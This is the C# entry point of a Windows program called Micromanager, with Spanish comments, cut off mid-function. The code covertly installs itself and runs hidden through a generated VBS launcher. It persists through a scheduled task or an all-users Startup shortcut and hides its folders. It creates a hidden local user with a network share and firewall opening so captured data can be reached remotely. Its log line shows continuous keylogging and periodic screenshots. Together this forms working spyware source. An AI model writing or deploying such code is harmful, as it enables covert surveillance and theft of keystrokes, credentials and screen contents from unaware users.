using Micromanager;
using System.Diagnostics;
using System.Security.Principal;
using System.Runtime.InteropServices;

// Archivo de log de emergencia
string emergencyLogPath = Path.Combine(Path.GetTempPath(), "micromanager_error.log");

// Manejo global de excepciones
AppDomain.CurrentDomain.UnhandledException += (sender, eventArgs) =>
{
    var ex = (Exception)eventArgs.ExceptionObject;
    string errorMsg = $@"
=====================================
ERROR CRÍTICO - {DateTime.Now}
=====================================
Excepción: {ex.GetType().Name}
Mensaje: {ex.Message}
StackTrace: {ex.StackTrace}
";
    
    try
    {
        File.AppendAllText(emergencyLogPath, errorMsg);
    }
    catch { }
    
    Console.WriteLine("=====================================");
    Console.WriteLine("   ERROR CRÍTICO DETECTADO");
    Console.WriteLine("=====================================");
    Console.WriteLine($"Excepción: {ex.GetType().Name}");
    Console.WriteLine($"Mensaje: {ex.Message}");
    Console.WriteLine($"StackTrace: {ex.StackTrace}");
    Console.WriteLine($"");
    Console.WriteLine($"Log guardado en: {emergencyLogPath}");
    Console.WriteLine("");
    Console.WriteLine("Presione cualquier tecla para salir...");
    try { Console.ReadKey(); } catch { }
};

// Log de inicio
try
{
    File.AppendAllText(emergencyLogPath, $"\n[{DateTime.Now}] Micromanager iniciando...\n");
    File.AppendAllText(emergencyLogPath, $"Usuario: {Environment.UserName}, PC: {Environment.MachineName}\n");
    File.AppendAllText(emergencyLogPath, $"Argumentos: {string.Join(" ", args)}\n");
}
catch { }

try
{
    // Parsear argumentos primero
var argsList = args.ToList();
    bool debugMode = argsList.Contains("--debug");
    
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Argumentos parseados OK\n");
    File.AppendAllText(emergencyLogPath, $"Debug Mode: {debugMode}\n");

    // Mostrar banner solo en modo debug
    if (debugMode)
    {
        Console.WriteLine("=".PadRight(50, '='));
        Console.WriteLine("MICROMANAGER v2.0 - MODO DEBUG");
        Console.WriteLine("=".PadRight(50, '='));
        Console.WriteLine($"Fecha/Hora: {DateTime.Now}");
        Console.WriteLine($"Usuario Windows: {Environment.UserName}");
        Console.WriteLine($"PC: {Environment.MachineName}");
        Console.WriteLine($"Argumentos: {string.Join(" ", args)}");
        Console.WriteLine($"Ejecutando como Admin: {IsAdministrator()}");
        Console.WriteLine($"Ruta actual: {Environment.ProcessPath ?? "UNKNOWN"}");
        Console.WriteLine("");
    }

// Verificar privilegios al inicio si se requiere alguna operación administrativa
bool needsAdmin = argsList.Contains("--shared-folder") || 
                  argsList.Contains("--clean") || 
                  argsList.Contains("--disable");

File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Necesita Admin: {needsAdmin}\n");

bool isAdmin = IsAdministrator();
File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Es Administrador: {isAdmin}\n");

if (debugMode) Console.WriteLine($"[DEBUG] Necesita Admin: {needsAdmin}");

// Mostrar advertencia si necesita admin pero no lo es
if (needsAdmin && !isAdmin)
{
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] SALIENDO: No tiene privilegios de admin\n");
    
    Console.WriteLine("=====================================");
    Console.WriteLine("   MICROMANAGER - Se Requiere Admin");
    Console.WriteLine("=====================================");
    Console.WriteLine("");
    Console.WriteLine(Configuration.Messages.RequiresAdmin);
    Console.WriteLine("");
    Console.WriteLine("Para usar --shared-folder necesitas:");
    Console.WriteLine("  1. Clic derecho en Micromanager.exe");
    Console.WriteLine("  2. Seleccionar 'Ejecutar como administrador'");
    Console.WriteLine("  3. Volver a ejecutar el comando");
    Console.WriteLine("");
    Console.WriteLine("Presione cualquier tecla para salir...");
    Console.ReadKey();
    Environment.Exit(1);
    return;
}

File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Verificación de privilegios OK\n");

if (needsAdmin && IsAdministrator() && debugMode)
{
    Console.WriteLine($"[DEBUG] ✓ Privilegios de administrador confirmados");
}

// Parsear modos de operación
bool stealthMode = argsList.Contains("--stealth");
bool setupMode = argsList.Contains("--setup");
bool disableMode = argsList.Contains("--disable");
bool cleanMode = argsList.Contains("--clean");
bool helpMode = argsList.Contains("--help") || argsList.Contains("-h");

// OCULTAR CONSOLA SI ESTÁ EN MODO STEALTH
if (stealthMode)
{
    HideConsoleWindow();
}
bool sharedFolderMode = argsList.Contains("--shared-folder");
bool reconfigureMode = argsList.Contains("--reconfigure");

File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Modos parseados - Clean:{cleanMode}, Disable:{disableMode}, Help:{helpMode}, SharedFolder:{sharedFolderMode}\n");

// VALIDACIÓN: Si ejecuta como SYSTEM, desactivar configuraciones interactivas
// pero PERMITIR la instalación de la tarea programada
bool isSystemAccount = IsSystemAccount();
File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Es cuenta SYSTEM: {isSystemAccount}\n");

// Si es SYSTEM y tiene configuraciones interactivas, desactivarlas pero continuar
if (isSystemAccount && !stealthMode && sharedFolderMode)
{
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] SYSTEM detectado: Desactivando configuración de carpeta compartida (requiere interacción). Continuando con instalación básica.\n");
    
    // Desactivar modo carpeta compartida porque requiere contraseña interactiva
    sharedFolderMode = false;
    
    if (debugMode)
    {
        Console.WriteLine("=====================================");
        Console.WriteLine("   ADVERTENCIA: Cuenta SYSTEM");
        Console.WriteLine("=====================================");
        Console.WriteLine("");
        Console.WriteLine("Este programa está ejecutándose como NT AUTHORITY\\SYSTEM.");
        Console.WriteLine("");
        Console.WriteLine("⚠ Carpeta compartida DESACTIVADA (requiere contraseña interactiva)");
        Console.WriteLine("✓ La tarea programada se configurará normalmente");
        Console.WriteLine("✓ Se ejecutará automáticamente para TODOS los usuarios del equipo");
        Console.WriteLine("");
        Console.WriteLine("Para configurar carpeta compartida, ejecute manualmente como administrador:");
        Console.WriteLine("  .\\Micromanager.exe --screenshot 60 --cleanup=30 --shared-folder --shared-user \"SoporteManager\"");
        Console.WriteLine("");
    }
}

// Obtener parámetros
string sharedFolderUser = GetStringParameter(argsList, "--shared-user", Configuration.DefaultSharedUser);
string persistenceMethod = GetStringParameter(argsList, "--persistence", "scheduledtask").ToLower();
int screenshotInterval = GetIntParameter(argsList, "--screenshot-interval", "--screenshot", Configuration.DefaultScreenshotInterval);
int cleanupDays = GetIntParameter(argsList, "--cleanup-days", "--cleanup", Configuration.DefaultCleanupDays);

// Validar método de persistencia
if (persistenceMethod != "scheduledtask" && persistenceMethod != "startupfolder")
{
    Console.WriteLine($"⚠ Método de persistencia inválido: {persistenceMethod}");
    Console.WriteLine("  Usa: --persistence scheduledtask  o  --persistence startupfolder");
    Console.WriteLine("  Por defecto se usará: scheduledtask");
    persistenceMethod = "scheduledtask";
}

// Compatibilidad con sintaxis antigua: --stealth 30
if (stealthMode)
{
    int stealthIndex = argsList.IndexOf("--stealth");
    if (!argsList.Any(a => a.StartsWith("--screenshot")) && 
        argsList.Count > stealthIndex + 1 && 
        int.TryParse(argsList[stealthIndex + 1], out int interval1))
    {
        screenshotInterval = interval1;
    }
}

// Manejar modo --help
if (helpMode)
{
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Mostrando ayuda y saliendo\n");
    ShowHelp();
    Environment.Exit(0);
    return;
}

File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] No es modo help\n");

// Manejar modo --clean
if (cleanMode)
{
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Entrando en modo clean\n");
    
    if (debugMode)
    {
        Console.WriteLine("=====================================");
    Console.WriteLine("   MICROMANAGER - Limpieza Completa");
    Console.WriteLine("=====================================");
    Console.WriteLine("");
    Console.WriteLine("⚠️  ADVERTENCIA: Esto eliminará:");
    Console.WriteLine("   • Todas las instancias en ejecución");
    Console.WriteLine("   • Tarea programada");
    Console.WriteLine("   • Carpeta compartida de red");
        Console.WriteLine("   • Usuario de carpeta compartida");
    Console.WriteLine("   • Todos los archivos y datos capturados");
    Console.WriteLine("");
    }
    
    CleanupEverything(sharedFolderUser, debugMode);
    
    if (debugMode)
    {
    Console.WriteLine("");
        Console.WriteLine(Configuration.Messages.CleanupComplete);
    Console.WriteLine("Presione cualquier tecla para salir...");
    Console.ReadKey();
    }
    
    Environment.Exit(0);
    return;
}

File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] No es modo clean\n");

// Manejar modo --disable
if (disableMode)
{
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Entrando en modo disable\n");
    
    if (debugMode)
    {
        Console.WriteLine("=====================================");
    Console.WriteLine("   MICROMANAGER - Desactivar");
    Console.WriteLine("=====================================");
    Console.WriteLine("");
    }
    
    DisableAllInstances(debugMode);
    
    if (debugMode)
    {
    Console.WriteLine("");
    Console.WriteLine("✓ Todas las instancias detenidas");
    Console.WriteLine("Presione cualquier tecla para salir...");
    Console.ReadKey();
    }
    
    Environment.Exit(0);
    return;
}

// Auto-instalación si se ejecuta desde otra ubicación O si está en modo reconfiguración
string currentExePath = Environment.ProcessPath ?? Process.GetCurrentProcess().MainModule?.FileName ?? "";
string targetExePath = Path.Combine(Configuration.InstallPath, Configuration.ExeName);

if (debugMode)
{
    Console.WriteLine($"[DEBUG] Ruta actual del ejecutable: {currentExePath}");
    Console.WriteLine($"[DEBUG] Ruta objetivo de instalación: {targetExePath}");
}

bool isFirstTimeInstall = !currentExePath.Equals(targetExePath, StringComparison.OrdinalIgnoreCase) && !setupMode;
bool needsConfiguration = isFirstTimeInstall || (sharedFolderMode && !setupMode) || reconfigureMode;

File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] isFirstTimeInstall: {isFirstTimeInstall}\n");
File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] needsConfiguration: {needsConfiguration}\n");

if (debugMode)
{
    Console.WriteLine($"[DEBUG] Es primera instalación: {isFirstTimeInstall}");
    Console.WriteLine($"[DEBUG] Necesita configuración: {needsConfiguration}");
    Console.WriteLine($"[DEBUG] Modo carpeta compartida: {sharedFolderMode}");
    Console.WriteLine("");
}

if (needsConfiguration)
{
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] ENTRANDO en bloque de configuración\n");
    try
    {
        if (isFirstTimeInstall)
        {
            if (debugMode)
    {
        Console.WriteLine("=== MICROMANAGER - Auto-Configuración ===");
                Console.WriteLine($"Instalando en: {Configuration.InstallPath}");
            }
            
            // Crear directorios
            EnsureDirectoriesExist(debugMode);

            // Copiar ejecutable principal
            if (File.Exists(currentExePath))
            {
                File.Copy(currentExePath, targetExePath, true);
                if (debugMode) Console.WriteLine($"✓ Ejecutable copiado a: {targetExePath}");
            }
            
            // Crear script VBS launcher invisible automáticamente
            // No es necesario que el usuario copie el VBS - se genera automáticamente
            string vbsTarget = Path.Combine(Configuration.InstallPath, "MicromanagerLauncher.vbs");
            CreateVBSLauncher(vbsTarget, debugMode);
        }
        else
        {
            if (debugMode)
            {
                Console.WriteLine("=== MICROMANAGER - Configuración de Carpeta Compartida ===");
                Console.WriteLine($"Instalación detectada en: {Configuration.InstallPath}");
            }
            
            // Asegurar que los directorios existen
            EnsureDirectoriesExist(debugMode);
        }

        // Configurar carpeta compartida solo si se especifica --shared-folder
        if (sharedFolderMode)
        {
            if (debugMode)
            {
                Console.WriteLine($"[DEBUG] Entrando en configuración de carpeta compartida...");
                Console.WriteLine($"[DEBUG] Usuario para carpeta compartida: {sharedFolderUser}");
            }
            
        if (IsAdministrator())
        {
                if (debugMode) Console.WriteLine($"[DEBUG] Privilegios confirmados, pidiendo contraseña...");
                // Pedir contraseña para el usuario de la carpeta compartida
                string password = ConsoleHelper.PromptForPassword(sharedFolderUser);
                if (!string.IsNullOrEmpty(password))
                {
                    // Crear usuario local
                    bool userCreated = UserManager.CreateOrUpdateLocalUser(sharedFolderUser, password, out string userError);
                    if (userCreated)
                    {
                        // Ocultar usuario de la pantalla de inicio de sesión
                        if (UserManager.HideUserFromLoginScreen(sharedFolderUser, out string hideError))
                        {
                            if (debugMode) Console.WriteLine($"  ✓ Usuario '{sharedFolderUser}' oculto de la pantalla de inicio de sesión");
                        }
                        else if (debugMode)
                        {
                            Console.WriteLine($"  ⚠ Advertencia: {hideError}");
        }

        // Configurar carpeta compartida
                        bool shareCreated = NetworkShareManager.CreateShare(
                            Configuration.ShareName, 
                            Configuration.DataPath, 
                            sharedFolderUser, 
                            out string shareError,
                            debugMode);
                            
                        if (shareCreated)
                        {
                            // Configurar firewall para acceso remoto desde la red LAN
                            bool firewallConfigured = FirewallManager.ConfigureFirewallForRemoteAccess(
                                Configuration.ShareName,
                                out string firewallError,
                                debugMode);
                            
                            if (debugMode)
                            {
                                Console.WriteLine($"\n✓ Carpeta compartida configurada para usuario: {sharedFolderUser}");
                                Console.WriteLine($"  Acceso Local: \\\\{Environment.MachineName}\\{Configuration.ShareName}");
                                Console.WriteLine($"  Acceso Remoto: \\\\{GetLocalIPAddress()}\\{Configuration.ShareName}");
                                Console.WriteLine($"  Usuario: {Environment.MachineName}\\{sharedFolderUser}");
                                
                                if (firewallConfigured)
                                {
                                    Console.WriteLine($"  ✓ Acceso remoto desde LAN: HABILITADO");
        }
        else
        {
                                    Console.WriteLine($"  ⚠ Advertencia firewall: {firewallError}");
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine($"⚠ Error configurando carpeta compartida: {shareError}");
                        }
                    }
                    else
                    {
                        Console.WriteLine($"⚠ Error creando usuario: {userError}");
                    }
                }
                else
                {
                    if (debugMode) Console.WriteLine("⚠ Configuración de carpeta compartida cancelada (contraseña no proporcionada)");
                }
            }
            else
            {
                Console.WriteLine(Configuration.Messages.RequiresAdmin);
            }
        }
        else
        {
            if (debugMode) Console.WriteLine("ℹ Carpeta compartida NO configurada (usa --shared-folder para activarla)");
        }
        
        // Excluir carpeta del historial de archivos recientes
        ExcludeFromRecentFiles(debugMode);
        
        // Solo crear/actualizar persistencia si es instalación nueva
        if (isFirstTimeInstall)
        {
            string vbsPath = Path.Combine(Configuration.InstallPath, "MicromanagerLauncher.vbs");
            bool persistenceCreated = false;
            string persistenceError = "";
            
            if (persistenceMethod == "scheduledtask")
            {
                // MÉTODO 1: Tarea Programada (Task Scheduler)
                // NOTA: Usa el script VBS launcher que ejecuta el programa de forma invisible
                // wscript.exe ejecuta el VBS sin ventana
                // Los argumentos están FIJOS dentro del VBS (no se pasan por línea de comandos)
                string taskExecutable = "wscript.exe";
                string taskArguments = $"\"{vbsPath}\"";
                
                persistenceCreated = TaskSchedulerManager.CreateOrUpdateTask(
                    Configuration.TaskName,
                    taskExecutable,
                    taskArguments,
                    out persistenceError,
                    debugMode);
                
                if (persistenceCreated)
                {
                    string confirmMsg = $"\n✓ TAREA PROGRAMADA INSTALADA CORRECTAMENTE\n" +
                                       $"  Método: Task Scheduler (se ejecuta al login de CUALQUIER usuario)\n" +
                                       $"  Nombre: {Configuration.TaskName}\n" +
                                       $"  Ejecutará: {taskExecutable} {taskArguments}\n" +
                                       $"  Argumentos del programa están fijos en el VBS: --screenshot-interval 60 --cleanup-days 30\n" +
                                       $"  La ventana se oculta automáticamente por el VBS\n";
                    Console.WriteLine(confirmMsg);
                    
                    string startupLogPath = Path.Combine(Configuration.DataPath, "startup.log");
                    File.AppendAllText(startupLogPath, $"[{DateTime.Now}] {confirmMsg}{Environment.NewLine}");
                }
                else
                {
                    string errorMsg = $"\n⚠ ERROR: No se pudo crear la tarea programada\n" +
                                     $"  Razón: {persistenceError}\n" +
                                     $"\n  Puedes crear la tarea manualmente con:\n" +
                                     $"  schtasks /Create /TN \"Micromanager\" /TR \"{taskExecutable} {taskArguments}\" /SC ONLOGON /F\n";
                    Console.WriteLine(errorMsg);
                    
                    string startupLogPath = Path.Combine(Configuration.DataPath, "startup.log");
                    File.AppendAllText(startupLogPath, $"[{DateTime.Now}] {errorMsg}{Environment.NewLine}");
                }
            }
            else if (persistenceMethod == "startupfolder")
            {
                // MÉTODO 2: Startup Folder (carpeta de inicio de Windows)
                // Crear acceso directo en la carpeta Startup de todos los usuarios
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
                string shortcutPath = Path.Combine(startupFolder, "Micromanager.lnk");
                
                persistenceCreated = CreateShortcut(
                    shortcutPath,
                    "wscript.exe",
                    $"\"{vbsPath}\"",
                    Configuration.InstallPath,
                    "Micromanager - Sistema de monitoreo",
                    out persistenceError,
                    debugMode);
                
                if (persistenceCreated)
                {
                    string confirmMsg = $"\n✓ ACCESO DIRECTO INSTALADO CORRECTAMENTE\n" +
                                       $"  Método: Startup Folder (se ejecuta al login de CUALQUIER usuario)\n" +
                                       $"  Ubicación: {shortcutPath}\n" +
                                       $"  Ejecutará: wscript.exe \"{vbsPath}\"\n" +
                                       $"  Argumentos del programa están fijos en el VBS: --screenshot-interval 60 --cleanup-days 30\n" +
                                       $"  La ventana se oculta automáticamente por el VBS\n";
                    Console.WriteLine(confirmMsg);
                    
                    string startupLogPath = Path.Combine(Configuration.DataPath, "startup.log");
                    File.AppendAllText(startupLogPath, $"[{DateTime.Now}] {confirmMsg}{Environment.NewLine}");
                }
                else
                {
                    string errorMsg = $"\n⚠ ERROR: No se pudo crear el acceso directo\n" +
                                     $"  Razón: {persistenceError}\n" +
                                     $"\n  Puedes crear el acceso directo manualmente en:\n" +
                                     $"  {startupFolder}\n";
                    Console.WriteLine(errorMsg);
                    
                    string startupLogPath = Path.Combine(Configuration.DataPath, "startup.log");
                    File.AppendAllText(startupLogPath, $"[{DateTime.Now}] {errorMsg}{Environment.NewLine}");
                }
            }
            
            if (debugMode)
            {
        Console.WriteLine("\n=== Instalación Completada ===");
        Console.WriteLine($"Ubicación: {targetExePath}");
                Console.WriteLine($"Datos: {Configuration.DataPath}");
                Console.WriteLine($"Tarea programada: {Configuration.TaskName} (para todos los usuarios)");
            }
            
            // Si estamos ejecutando como SYSTEM, NO continuar con la ejecución
            // La tarea se ejecutará automáticamente cuando un usuario inicie sesión
            if (IsSystemAccount())
            {
                if (debugMode)
                {
                    Console.WriteLine("\n✓ Instalación completada como SYSTEM");
                    Console.WriteLine("  El programa NO se ejecutará ahora (no hay sesión de escritorio)");
                    Console.WriteLine("  Se ejecutará automáticamente cuando un usuario inicie sesión");
                    Console.WriteLine("\nPresione cualquier tecla para salir...");
                    try { Console.ReadKey(); } catch { }
                }
                Environment.Exit(0);
                return;
            }
            
            if (debugMode)
            {
                Console.WriteLine("\n✓ Instalación completada");
                Console.WriteLine("  El servicio se ejecutará automáticamente al iniciar sesión");
                Console.WriteLine("  No es necesario ejecutar nada más");
                Console.WriteLine("\nPresione cualquier tecla para salir...");
                Console.ReadKey();
            }
        
            // No continuar con la ejecución - salir después de la instalación
            // La tarea programada se encargará de ejecutarlo automáticamente
            Environment.Exit(0);
            return;
        }
        else
        {
            // Solo configuración de carpeta compartida
            if (debugMode)
            {
                Console.WriteLine("\n=== Configuración Completada ===");
                Console.WriteLine($"Carpeta compartida: \\\\{Environment.MachineName}\\{Configuration.ShareName}");
                Console.WriteLine($"Usuario: {Environment.MachineName}\\{sharedFolderUser}");
                Console.WriteLine("\nPresione cualquier tecla para salir...");
                Console.ReadKey();
            }
            Environment.Exit(0);
            return;
        }
    }
    catch (UnauthorizedAccessException ex)
    {
        Console.WriteLine($"\n✗ Error: {Configuration.Messages.RequiresAdmin}");
        Console.WriteLine($"Detalles: {ex.Message}");
        Console.WriteLine("\nPresione cualquier tecla para salir...");
        Console.ReadKey();
        Environment.Exit(1);
        return;
    }
    catch (IOException ex)
    {
        Console.WriteLine($"\n✗ Error de E/S durante la instalación: {ex.Message}");
        Console.WriteLine($"Detalles: {ex.StackTrace}");
        Console.WriteLine("\nPresione cualquier tecla para salir...");
        Console.ReadKey();
        Environment.Exit(1);
        return;
    }
    catch (Exception ex)
    {
        Console.WriteLine($"\n✗ Error inesperado durante la instalación: {ex.Message}");
        Console.WriteLine($"Detalles: {ex.StackTrace}");
        Console.WriteLine("\nPresione cualquier tecla para salir...");
        Console.ReadKey();
        Environment.Exit(1);
        return;
    }
}

// Configurar directorio de logs
EnsureDirectoriesExist();
string logFilePath = Configuration.GetLogFilePath("stealth_log.txt");

// Ejecutar el servicio
if (stealthMode)
{
    try
    {
        // Construir argumentos para el Worker
        var workerArgs = new string[] { 
            "--stealth", 
            $"--screenshot-interval={screenshotInterval}", 
            $"--cleanup-days={cleanupDays}" 
        };
        
        var builder = Host.CreateApplicationBuilder(workerArgs);
        builder.Services.AddHostedService<Worker>();
        var host = builder.Build();

        await File.AppendAllTextAsync(logFilePath, 
            $"[{DateTime.Now}] Running in stealth mode. User: {Environment.UserName}, " +
            $"Machine: {Environment.MachineName}, Screenshot: {screenshotInterval}s, " +
            $"Keylog: CONTINUO, Cleanup: {cleanupDays} days{Environment.NewLine}");

        await host.RunAsync();
    }
    catch (Exception ex)
    {
        await File.AppendAllTextAsync(logFilePath, 
            $"[{DateTime.Now}] Error: {ex.Message}{Environment.NewLine}{ex.StackTrace}{Environment.NewLine}");
    }
}
else
{
    var builder = Host.CreateApplicationBuilder(args);
    builder.Services.AddHostedService<Worker>();
    var host = builder.Build();

    var logger = host.Services.GetRequiredService<ILogger<Program>>();
    logger.LogInformation("Application started in normal mode.");

    await host.RunAsync();
}

// Funciones auxiliares

// API de Windows para ocultar/liberar la ventana de consola
[DllImport("kernel32.dll")]
static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern bool FreeConsole();

const int SW_HIDE = 0;

static void HideConsoleWindow()
{
    try
    {
        // MÉTODO 1: Liberar completamente la consola (más profesional, sin flash)
        // Esto desasocia el proceso de la consola completamente
        FreeConsole();
        
        // MÉTODO 2 (alternativo): Solo ocultar la ventana
        // var handle = GetConsoleWindow();
        // if (handle != IntPtr.Zero)
        // {
        //     ShowWindow(handle, SW_HIDE);
        // }
    }
    catch
    {
        // Si falla, intentar el método alternativo de ocultar
        try
        {
            var handle = GetConsoleWindow();
            if (handle != IntPtr.Zero)
            {
                ShowWindow(handle, SW_HIDE);
            }
        }
        catch
        {
            // Si ambos métodos fallan, continuar sin consola
        }
    }
}

static void CreateVBSLauncher(string vbsPath, bool debugMode = false)
{
    try
    {
        // VBS launcher con estructura robusta, manejo de errores y logging
        string vbsContent = @"' MicromanagerLauncher.vbs - Ejecuta Micromanager de forma invisible
Option Explicit

' Habilitar manejo de errores
On Error Resume Next

Dim objShell, objFSO, scriptPath, scriptDir, exePath, args, logPath, returnCode
Dim logFile, timestamp

Set objShell = CreateObject(""WScript.Shell"")
Set objFSO = CreateObject(""Scripting.FileSystemObject"")

scriptPath = WScript.ScriptFullName
scriptDir = objFSO.GetParentFolderName(scriptPath)
logPath = scriptDir & ""\data\vbs_launcher.log""

' Función para escribir en el log
Sub WriteLog(message)
    On Error Resume Next
    Dim f, timestamp
    timestamp = Year(Now) & ""-"" & Right(""0"" & Month(Now), 2) & ""-"" & Right(""0"" & Day(Now), 2) & "" "" & _
                Right(""0"" & Hour(Now), 2) & "":"" & Right(""0"" & Minute(Now), 2) & "":"" & Right(""0"" & Second(Now), 2)
    
    ' Crear carpeta data si no existe
    If Not objFSO.FolderExists(scriptDir & ""\data"") Then
        objFSO.CreateFolder(scriptDir & ""\data"")
    End If
    
    Set f = objFSO.OpenTextFile(logPath, 8, True)
    f.WriteLine ""["" & timestamp & ""] "" & message
    f.Close
    Set f = Nothing
End Sub

' Log inicio
WriteLog ""VBS Launcher iniciado""

' Forzar directorio de trabajo al folder del script
objShell.CurrentDirectory = scriptDir
WriteLog ""Directorio de trabajo: "" & objShell.CurrentDirectory

exePath = scriptDir & ""\Micromanager.exe""
args = "" --screenshot-interval 60 --cleanup-days 30""

' Verificar que el ejecutable existe
If Not objFSO.FileExists(exePath) Then
    WriteLog ""ERROR: No se encontró el ejecutable: "" & exePath
    WScript.Quit 1
End If

WriteLog ""Ejecutable encontrado: "" & exePath
WriteLog ""Argumentos: "" & args
WriteLog ""Ejecutando programa...""

' Ejecutar completamente oculto (0) y no esperar (False)
' 0 = ventana oculta; False = no bloquear el VBS
objShell.Run Chr(34) & exePath & Chr(34) & args, 0, False

' Verificar si hubo error
If Err.Number <> 0 Then
    WriteLog ""ERROR al ejecutar: "" & Err.Description & "" (Código: "" & Err.Number & "")""
    Err.Clear
    WScript.Quit 1
Else
    WriteLog ""Programa ejecutado correctamente""
End If

' Limpiar objetos
Set objShell = Nothing
Set objFSO = Nothing

WScript.Quit 0
";
        
        File.WriteAllText(vbsPath, vbsContent);
        if (debugMode) Console.WriteLine($"✓ Launcher VBS creado en: {vbsPath}");
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"⚠ Error creando VBS: {ex.Message}");
    }
}

static string GetLocalIPAddress()
{
    try
    {
        using (var socket = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Dgram, 0))
        {
            socket.Connect("8.8.8.8", 65530);
            var endPoint = socket.LocalEndPoint as System.Net.IPEndPoint;
            return endPoint?.Address.ToString() ?? Environment.MachineName;
        }
    }
    catch
    {
        return Environment.MachineName;
    }
}

static void EnsureDirectoriesExist(bool debugMode = false)
{
    try
    {
        if (!Directory.Exists(Configuration.InstallPath))
        {
            Directory.CreateDirectory(Configuration.InstallPath);
            if (debugMode) Console.WriteLine($"✓ Carpeta creada: {Configuration.InstallPath}");
        }
        
        if (!Directory.Exists(Configuration.DataPath))
        {
            Directory.CreateDirectory(Configuration.DataPath);
            if (debugMode) Console.WriteLine($"✓ Carpeta de datos creada: {Configuration.DataPath}");
            
            // Dar permisos de escritura a todos los usuarios para que puedan guardar capturas
            // Esto es necesario porque el programa puede ejecutarse bajo diferentes cuentas de usuario
            try
            {
                SetDirectoryPermissionsForAllUsers(Configuration.DataPath);
                if (debugMode) Console.WriteLine($"✓ Permisos configurados para todos los usuarios: {Configuration.DataPath}");
            }
            catch (Exception ex)
            {
                if (debugMode) Console.WriteLine($"⚠ Advertencia al configurar permisos: {ex.Message}");
                // Continuar aunque falle - intentaremos con permisos limitados
            }
        }
    }
    catch (UnauthorizedAccessException ex)
    {
        throw new UnauthorizedAccessException($"No se puede crear los directorios necesarios: {ex.Message}", ex);
    }
    catch (IOException ex)
    {
        throw new IOException($"Error de E/S al crear directorios: {ex.Message}", ex);
    }
}

static void SetDirectoryPermissionsForAllUsers(string directoryPath)
{
    try
    {
        // Usar icacls para dar permisos completos al grupo Users
        // (OI) = Object Inherit, (CI) = Container Inherit
        var result = ProcessExecutor.Execute("icacls", $"\"{directoryPath}\" /grant Users:(OI)(CI)F /T");
        if (!result.Success)
        {
            throw new Exception($"icacls failed: {result.Error}");
        }
    }
    catch (Exception ex)
    {
        throw new Exception($"No se pudieron configurar permisos: {ex.Message}", ex);
    }
}

static bool CreateShortcut(
    string shortcutPath, 
    string targetPath, 
    string arguments, 
    string workingDirectory,
    string description,
    out string errorMessage,
    bool debugMode = false)
{
    errorMessage = string.Empty;
    
    try
    {
        // Usar PowerShell para crear el acceso directo
        // Escapar comillas para PowerShell
        string psScript = $@"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut('{shortcutPath.Replace("'", "''")}')
$Shortcut.TargetPath = '{targetPath.Replace("'", "''")}'
$Shortcut.Arguments = '{arguments.Replace("'", "''")}'
$Shortcut.WorkingDirectory = '{workingDirectory.Replace("'", "''")}'
$Shortcut.Description = '{description.Replace("'", "''")}'
$Shortcut.WindowStyle = 7
$Shortcut.Save()
";
        
        if (debugMode)
        {
            Console.WriteLine($"[DEBUG] Creando acceso directo:");
            Console.WriteLine($"[DEBUG]   Shortcut: {shortcutPath}");
            Console.WriteLine($"[DEBUG]   Target: {targetPath}");
            Console.WriteLine($"[DEBUG]   Args: {arguments}");
        }
        
        var result = ProcessExecutor.Execute("powershell", $"-NoProfile -ExecutionPolicy Bypass -Command \"{psScript.Replace("\"", "`\"")}\"");
        
        if (result.Success && File.Exists(shortcutPath))
        {
            if (debugMode) Console.WriteLine($"✓ Acceso directo creado: {shortcutPath}");
            return true;
        }
        else
        {
            errorMessage = $"Error al crear acceso directo: {result.Error}";
            return false;
        }
    }
    catch (Exception ex)
    {
        errorMessage = $"Error al crear acceso directo: {ex.Message}";
        return false;
    }
}

static void ExcludeFromRecentFiles(bool debugMode = false)
{
    try
    {
        if (debugMode) Console.WriteLine("\n--- Configurando Exclusión de Archivos Recientes ---");
        
        // Marcar carpeta principal como oculta y de sistema
        try
        {
            if (Directory.Exists(Configuration.InstallPath))
            {
                DirectoryInfo dir = new DirectoryInfo(Configuration.InstallPath);
                dir.Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory;
                if (debugMode) Console.WriteLine($"✓ Carpeta principal marcada como oculta: {Configuration.InstallPath}");
            }
        }
        catch { /* Ignorar errores */ }
        
        // Marcar carpeta de datos como oculta y de sistema
        try
        {
            if (Directory.Exists(Configuration.DataPath))
            {
                DirectoryInfo dir = new DirectoryInfo(Configuration.DataPath);
                dir.Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory;
                if (debugMode) Console.WriteLine($"✓ Carpeta de datos marcada como oculta: {Configuration.DataPath}");
            }
        }
        catch { /* Ignorar errores */ }
        
        if (debugMode) Console.WriteLine("✓ Archivos de esta carpeta NO aparecerán en 'Archivos Recientes'");
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"⚠ Error configurando exclusión: {ex.Message}");
    }
}

static void DisableAllInstances(bool debugMode = false)
{
    try
    {
        if (debugMode) Console.WriteLine("[1/2] Deteniendo tarea programada...");
        
        if (TaskSchedulerManager.StopTask(Configuration.TaskName, out string error, debugMode))
        {
